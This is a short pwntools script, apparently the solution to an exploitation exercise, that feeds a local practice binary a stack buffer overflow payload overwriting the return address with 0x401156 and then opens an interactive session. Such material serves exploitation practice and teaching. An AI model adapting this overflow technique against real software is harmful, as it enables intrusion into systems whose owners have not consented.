#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex3")

payload = b'A'*32 + b'B'*8 + b'C'*8 + b'D'*8 + p64(0x401156)  # craft the payload

target.send(payload)

target.interactive()
